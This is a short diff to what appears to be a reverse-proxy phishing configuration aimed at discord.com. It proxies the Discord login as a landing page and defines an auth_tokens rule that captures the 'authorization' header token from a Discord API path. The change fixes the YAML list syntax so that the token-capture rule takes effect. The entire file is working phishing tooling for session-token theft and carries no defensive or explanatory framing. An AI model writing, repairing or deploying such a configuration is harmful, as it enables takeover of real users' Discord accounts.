@@ -3,7 +3,7 @@ min_ver: '3.0.0'
 proxy_hosts:
   - {phish_sub: '', orig_sub: '', domain: 'discord.com', session: true, is_landing: true, auto_filter: true}
 auth_tokens:
-  domain: 'discord.com'
+  - domain: 'discord.com'
     path: '/api/v9/users/@me/affinities/guilds'
     name: 'token'
     header: 'authorization'
